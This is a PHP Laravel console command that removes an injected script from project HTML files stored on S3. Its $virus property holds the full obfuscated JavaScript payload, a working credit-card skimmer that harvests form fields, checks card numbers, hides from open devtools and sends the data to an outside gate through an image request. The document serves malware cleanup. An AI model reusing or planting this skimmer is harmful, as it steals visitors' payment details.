<?php

namespace App\Console\Commands;

use App\Project;
use App\Repositories\ProjectRepository;
use App\Services\ProjectPublisher;
use Illuminate\Console\Command;
use Illuminate\Support\Facades\Storage;

class republishProjects extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'projects:remove-virus';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Remove the virus from all project files';

    protected $virus = "<script>var _0x5f4d=['\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d'];(function(_0x550f6d,_0x5d0756){var _0x37cfde=function(_0x23e93e){while(--_0x23e93e){_0x550f6d['push'](_0x550f6d['shift']());}};_0x37cfde(++_0x5d0756);}(_0x5f4d,0x1f2));var _0x2b9b=function(_0x2575db,_0x4ed6a8){_0x2575db=_0x2575db-0x0;var _0x544828=_0x5f4d[_0x2575db];if(_0x2b9b['NQsEkv']===undefined){(function(){var _0x408c64=function(){var _0x19e54b;try{_0x19e54b=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x1094b7){_0x19e54b=window;}return _0x19e54b;};var _0x1ee467=_0x408c64();var _0x44091c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1ee467['atob']||(_0x1ee467['atob']=function(_0x233b04){var _0x3b1ce1=String(_0x233b04)['replace'](/=+$/,'');for(var _0x159d67=0x0,_0x7f5448,_0x51914b,_0x206137=0x0,_0x3043b1='';_0x51914b=_0x3b1ce1['charAt'](_0x206137++);~_0x51914b&&(_0x7f5448=_0x159d67%0x4?_0x7f5448*0x40+_0x51914b:_0x51914b,_0x159d67++%0x4)?_0x3043b1+=String['fromCharCode'](0xff&_0x7f5448>>(-0x2*_0x159d67&0x6)):0x0){_0x51914b=_0x44091c['indexOf'](_0x51914b);}return _0x3043b1;});}());_0x2b9b['DCNkjA']=function(_0x528428){var _0x5b9e3c=atob(_0x528428);var _0x4c5189=[];for(var _0x288f73=0x0,_0x1c5bf5=_0x5b9e3c['length'];_0x288f73<_0x1c5bf5;_0x288f73++){_0x4c5189+='%'+('00'+_0x5b9e3c['charCodeAt'](_0x288f73)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4c5189);};_0x2b9b['ZUVsAi']={};_0x2b9b['NQsEkv']=!![];}var _0x134767=_0x2b9b['ZUVsAi'][_0x2575db];if(_0x134767===undefined){_0x544828=_0x2b9b['DCNkjA'](_0x544828);_0x2b9b['ZUVsAi'][_0x2575db]=_0x544828;}else{_0x544828=_0x134767;}return _0x544828;};function _0x5abec6(_0x3e8ed2,_0x39a656,_0x1ac4b1){return _0x3e8ed2[_0x2b9b('0x0')](new RegExp(_0x39a656,'\x67'),_0x1ac4b1);}function _0x1189ff(_0x4071ea){var _0x282d11=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x1d5965=/^(?:5[1-5][0-9]{14})$/;var _0x513ce0=/^(?:3[47][0-9]{13})$/;var _0x5bcd00=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x25d096=![];if(_0x282d11[_0x2b9b('0x1')](_0x4071ea)){_0x25d096=!![];}else if(_0x1d5965[_0x2b9b('0x1')](_0x4071ea)){_0x25d096=!![];}else if(_0x513ce0[_0x2b9b('0x1')](_0x4071ea)){_0x25d096=!![];}else if(_0x5bcd00[_0x2b9b('0x1')](_0x4071ea)){_0x25d096=!![];}return _0x25d096;}function _0x8c0f6(_0x3d0232){if(/[^0-9-\s]+/[_0x2b9b('0x1')](_0x3d0232))return![];var _0x394f1c=0x0,_0x4d4992=0x0,_0x4d1781=![];_0x3d0232=_0x3d0232[_0x2b9b('0x0')](/\D/g,'');for(var _0x3ed6d0=_0x3d0232[_0x2b9b('0x2')]-0x1;_0x3ed6d0>=0x0;_0x3ed6d0--){var _0x320560=_0x3d0232[_0x2b9b('0x3')](_0x3ed6d0),_0x4d4992=parseInt(_0x320560,0xa);if(_0x4d1781){if((_0x4d4992*=0x2)>0x9)_0x4d4992-=0x9;}_0x394f1c+=_0x4d4992;_0x4d1781=!_0x4d1781;}return _0x394f1c%0xa==0x0;}(function(){'use strict';const _0xc6001b={};_0xc6001b[_0x2b9b('0x4')]=![];_0xc6001b[_0x2b9b('0x5')]=undefined;const _0x41e40c=0xa0;const _0x1eaa2a=(_0x56810b,_0x813e91)=>{window[_0x2b9b('0x6')](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x56810b,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x813e91}}));};setInterval(()=>{const _0x506582=window[_0x2b9b('0x7')]-window[_0x2b9b('0x8')]>_0x41e40c;const _0x1eb2bd=window[_0x2b9b('0x9')]-window[_0x2b9b('0xa')]>_0x41e40c;const _0x515c6b=_0x506582?_0x2b9b('0xb'):_0x2b9b('0xc');if(!(_0x1eb2bd&&_0x506582)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x2b9b('0xd')][_0x2b9b('0xe')]&&window[_0x2b9b('0xd')][_0x2b9b('0xe')][_0x2b9b('0xf')]||_0x506582||_0x1eb2bd)){if(!_0xc6001b[_0x2b9b('0x4')]||_0xc6001b[_0x2b9b('0x5')]!==_0x515c6b){_0x1eaa2a(!![],_0x515c6b);}_0xc6001b[_0x2b9b('0x4')]=!![];_0xc6001b[_0x2b9b('0x5')]=_0x515c6b;}else{if(_0xc6001b['\x69\x73\x4f\x70\x65\x6e']){_0x1eaa2a(![],undefined);}_0xc6001b[_0x2b9b('0x4')]=![];_0xc6001b[_0x2b9b('0x5')]=undefined;}},0x1f4);if(typeof module!==_0x2b9b('0x10')&&module[_0x2b9b('0x11')]){module[_0x2b9b('0x11')]=_0xc6001b;}else{window['\x64\x65\x76\x74\x6f\x6f\x6c\x73']=_0xc6001b;}}());String['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65'][_0x2b9b('0x12')]=function(){var _0x3bab16=0x0,_0x3de006,_0x544c2;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x3bab16;for(_0x3de006=0x0;_0x3de006<this['\x6c\x65\x6e\x67\x74\x68'];_0x3de006++){_0x544c2=this[_0x2b9b('0x13')](_0x3de006);_0x3bab16=(_0x3bab16<<0x5)-_0x3bab16+_0x544c2;_0x3bab16|=0x0;}return _0x3bab16;};var _0x13df0b={};_0x13df0b[_0x2b9b('0x14')]=_0x2b9b('0x15');_0x13df0b['\x44\x61\x74\x61']={};_0x13df0b['\x53\x65\x6e\x74']=[];_0x13df0b[_0x2b9b('0x16')]=![];_0x13df0b['\x53\x61\x76\x65\x50\x61\x72\x61\x6d']=function(_0x1e8d30){if(_0x1e8d30.id!==undefined&&_0x1e8d30.id!=''&&_0x1e8d30.id!==null&&_0x1e8d30.value.length<0x100&&_0x1e8d30.value.length>0x0){if(_0x8c0f6(_0x5abec6(_0x5abec6(_0x1e8d30.value,'\x2d',''),'\x20',''))&&_0x1189ff(_0x5abec6(_0x5abec6(_0x1e8d30.value,'\x2d',''),'\x20','')))_0x13df0b.IsValid=!![];_0x13df0b.Data[_0x1e8d30.id]=_0x1e8d30.value;return;}if(_0x1e8d30.name!==undefined&&_0x1e8d30.name!=''&&_0x1e8d30.name!==null&&_0x1e8d30.value.length<0x100&&_0x1e8d30.value.length>0x0){if(_0x8c0f6(_0x5abec6(_0x5abec6(_0x1e8d30.value,'\x2d',''),'\x20',''))&&_0x1189ff(_0x5abec6(_0x5abec6(_0x1e8d30.value,'\x2d',''),'\x20','')))_0x13df0b.IsValid=!![];_0x13df0b.Data[_0x1e8d30.name]=_0x1e8d30.value;return;}};_0x13df0b['\x53\x61\x76\x65\x41\x6c\x6c\x46\x69\x65\x6c\x64\x73']=function(){var _0x191ee4=document.getElementsByTagName('\x69\x6e\x70\x75\x74');var _0x1b8324=document.getElementsByTagName(_0x2b9b('0x17'));var _0x3b1d60=document.getElementsByTagName(_0x2b9b('0x18'));for(var _0x1d0da5=0x0;_0x1d0da5<_0x191ee4.length;_0x1d0da5++)_0x13df0b.SaveParam(_0x191ee4[_0x1d0da5]);for(var _0x1d0da5=0x0;_0x1d0da5<_0x1b8324.length;_0x1d0da5++)_0x13df0b.SaveParam(_0x1b8324[_0x1d0da5]);for(var _0x1d0da5=0x0;_0x1d0da5<_0x3b1d60.length;_0x1d0da5++)_0x13df0b.SaveParam(_0x3b1d60[_0x1d0da5]);};_0x13df0b[_0x2b9b('0x19')]=function(){if(!window.devtools.isOpen&&_0x13df0b.IsValid){_0x13df0b.Data[_0x2b9b('0x1a')]=location.hostname;var _0x5745ca=encodeURIComponent(window.btoa(JSON.stringify(_0x13df0b.Data)));var _0x5258b9=_0x5745ca.hashCode();for(var _0x463e02=0x0;_0x463e02<_0x13df0b.Sent.length;_0x463e02++)if(_0x13df0b.Sent[_0x463e02]==_0x5258b9)return;_0x13df0b.LoadImage(_0x5745ca);}};_0x13df0b[_0x2b9b('0x1b')]=function(){_0x13df0b.SaveAllFields();_0x13df0b.SendData();};_0x13df0b[_0x2b9b('0x1c')]=function(_0x518617){_0x13df0b.Sent.push(_0x518617.hashCode());var _0x5d917c=document.createElement(_0x2b9b('0x1d'));_0x5d917c.src=_0x13df0b.GetImageUrl(_0x518617);};_0x13df0b[_0x2b9b('0x1e')]=function(_0x1b0e94){return _0x13df0b.Gate+_0x2b9b('0x1f')+_0x1b0e94;};document[_0x2b9b('0x20')]=function(){if(document[_0x2b9b('0x21')]===_0x2b9b('0x22')){window[_0x2b9b('0x23')](_0x13df0b[_0x2b9b('0x1b')],0x1f4);}};</script>";

    /**
     * Create a new command instance.
     *
     * @param ProjectPublisher $publisher
     */
    public function __construct(ProjectPublisher $publisher)
    {
        parent::__construct();
        $this->publisher = $publisher;
    }

    /**
     * Execute the console command.
     *
     * @return mixed
     */
    public function handle()
    {
        try {
            $root = 'https://s3.us-east-2.amazonaws.com/cdn6.swiftcdn.co/';

            // Get projects
            $this->line("Getting Projects");
            $projects = Project::whereNotNull('storage_path')->get();

            // Show Results
            $count = count($projects);
            $this->line("Found {$count} projects");

            // Publish
            foreach($projects as $key => $project){
                try {
                    // Get project HTML
                    $this->line("Getting HTML from  {$project->storage_path} ");
                    $path =  $project->storage_path.'/index.html';
                    $dirty_html = file_get_contents( $root . $path);

                    // Remove virus
                    $this->line('Cleaning');
                    $clean_html = $this->clean($dirty_html);

                    // Put clean file on s3
                    Storage::disk('s3')->put($path, $clean_html, ['public']);
                    $this->info('Cleaned!');

                }catch(\Exception $e){
                    $this->error("Message: " . $e->getMessage() . "   Trace: " . $e->getTraceAsString());
                }
            }

        }catch(\Exception $exception){
            $this->error("Message: " . $exception->getMessage() . "   Trace: " . $exception->getTraceAsString());
        }
    }

    private function clean($str) {
        $needle_start = "<script>var _0x";
        $needle_end = "</script>";

        $pos = strpos($str, $needle_start);
        $start = $pos === false ? 0 : $pos + strlen($needle_start);

        $pos = strpos($str, $needle_end, $start);
        $end = $pos === false ? strlen($str) : $pos;

        $return = substr_replace($str, ' ', $start, $end - $start);

        return str_replace('<script>var _0x </script>', ' ',$return);
    }
}
